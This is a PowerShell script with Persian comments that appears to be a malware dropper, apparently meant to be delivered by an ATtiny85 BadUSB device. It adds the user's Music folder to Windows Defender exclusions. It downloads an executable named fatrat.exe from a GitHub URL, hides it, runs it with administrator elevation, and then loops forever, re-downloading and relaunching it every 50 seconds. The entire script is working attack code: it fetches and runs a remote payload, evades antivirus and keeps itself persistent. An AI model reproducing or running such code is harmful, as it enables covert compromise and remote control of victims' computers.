$path = Join-Path $env:USERPROFILE "Music\fatrat.exe"
$url  = "https://github.com/armanina444/deadly-spark-attiny85/raw/refs/heads/main/fatrat.exe"

# تابع کمکی برای اطمینان از وجود فایل (دانلود در صورت نبودن)
function Ensure-File {
    param([string]$FilePath, [string]$Url)

    if (-not (Test-Path $FilePath)) {
        try {
            # اطمینان از وجود پوشه مقصد
            $dir = Split-Path $FilePath -Parent
            if (-not (Test-Path $dir)) {
                New-Item -ItemType Directory -Path $dir -Force | Out-Null
            }

            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] فایل پیدا نشد. در حال دانلود مجدد..." -ForegroundColor Yellow
            Invoke-WebRequest -Uri $Url -OutFile $FilePath -UseBasicParsing

            # مخفی کردن فایل
            Set-ItemProperty -Path $FilePath -Name Attributes -Value Hidden

            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] دانلود کامل شد." -ForegroundColor Green
        }
        catch {
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] خطا در دانلود: $_" -ForegroundColor Red
        }
    }
}

# --- اجرای اولیه ---
# حذف نسخه قبلی (اگر وجود دارد)
if (Test-Path $path) {
    Remove-Item $path -Force -ErrorAction SilentlyContinue
}

# افزودن پوشه به Exclusion آنتی‌ویروس
Add-MpPreference -ExclusionPath "$env:USERPROFILE\Music" -ErrorAction SilentlyContinue

# دانلود اولیه
Ensure-File -FilePath $path -Url $url

# اجرای اولیه با دسترسی ادمین
if (Test-Path $path) {
    Start-Process -FilePath $path -Verb RunAs
}

# --- حلقه اصلی ---
while ($true) {
    # اگر فایل پاک شده باشد، دوباره دانلود کن
    Ensure-File -FilePath $path -Url $url

    # اگر فایل موجود بود، اجرا کن
    if (Test-Path $path) {
        try {
            Start-Process -FilePath $path -ErrorAction SilentlyContinue
        }
        catch {
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] خطا در اجرا: $_" -ForegroundColor Red
        }
    }

    Start-Sleep -Seconds 50
}
